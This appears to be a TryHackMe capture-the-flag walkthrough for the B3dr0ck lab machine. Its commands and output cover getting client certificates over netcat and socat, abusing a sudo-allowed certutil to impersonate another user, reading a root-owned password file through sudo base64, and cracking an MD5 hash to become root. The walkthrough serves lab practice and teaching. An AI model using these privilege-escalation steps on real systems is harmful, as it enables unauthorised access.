---
title: B3dr0ck
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the B3dr0ck
  machine on TryHackMe.
slug: b3dr0ck
---




```
nmap -sC -sV -p- .........
```

```
nc -v 10.66.142.253 9009

can get `certificate` & `key` and help cmd

`help
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
`
```

```
socat stdio ssl:10.66.142.253:54321,cert=certificate,key=key,verify=0

```

```
Welcome: 'Barney Rubble' is authorized.
b3dr0ck> password
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
b3dr0ck> ls
Unrecognized command: 'ls'

This service is for login and password hints
b3dr0ck> whoami
Current user = 'Barney Rubble' (valid peer certificate)
b3dr0ck> dir
Unrecognized command: 'dir'

This service is for login and password hints
b3dr0ck> login
Login is disabled. Please use SSH instead.
b3dr0ck> help

```

```
ssh barney@10.66.142.253  
barney@ip-10-66-142-253:~$ cat barney.txt

barney@ip-10-66-142-253:/home/fred$ sudo -l
[sudo] password for barney: 
Matching Defaults entries for barney on ip-10-66-142-253:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on ip-10-66-142-253:
    (ALL : ALL) /usr/bin/certutil


```

```
barney@ip-10-66-142-253:/home/fred$ certutil ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30  2022 .
drwxrwxr-x 8 root root 4096 Apr 29  2022 ..
-rw-r----- 1 root root  972 Dec 20 15:42 barney.certificate.pem
-rw-r----- 1 root root 1674 Dec 20 15:42 barney.clientKey.pem
-rw-r----- 1 root root  894 Dec 20 15:42 barney.csr.pem
-rw-r----- 1 root root 1678 Dec 20 15:42 barney.serviceKey.pem
-rw-r----- 1 root root  976 Dec 20 15:42 fred.certificate.pem
-rw-r----- 1 root root 1674 Dec 20 15:42 fred.clientKey.pem
-rw-r----- 1 root root  898 Dec 20 15:42 fred.csr.pem
-rw-r----- 1 root root 1678 Dec 20 15:42 fred.serviceKey.pem


barney@ip-10-66-142-253:/home/fred$ certutil -h

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]


barney@ip-10-66-142-253:/home/fred$ sudo certutil -a fred.csr.pem
Generating credentials for user: a (fredcsrpem)

```

> Now I have `certificate` & `key` Now re login

```
socat stdio ssl:10.66.142.253:54321,cert=certificate,key=key,verify=0

Welcome: 'fredcsrpem' is authorized.
b3dr0ck> passwor
dPassword hint:...........
```

> Now have fred pwd so login as fred

```
barney@ip-10-66-142-253:/home/fred$ su fred
Password: 
fred@ip-10-66-142-253:~$ cat fred.txt

```

```
fred@ip-10-66-142-253:~$ sudo -l
Matching Defaults entries for fred on ip-10-66-142-253:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on ip-10-66-142-253:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt

```

```
sudo /usr/bin/base64 /root/pass.txt
TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
................

```

> I have to decode

> From Base64 -->  .............
> From Base32 & Base64 --> .........

> Now have md5 hashm -->..............

> Use crackstation to crack --> ................

> Now login as a root

```
su
Password: 
root@ip-10-66-142-253:/home/fred# cd /root
root@ip-10-66-142-253:~# ls
pass.txt  root.txt  snap
root@ip-10-66-142-253:~# cat root.txt

```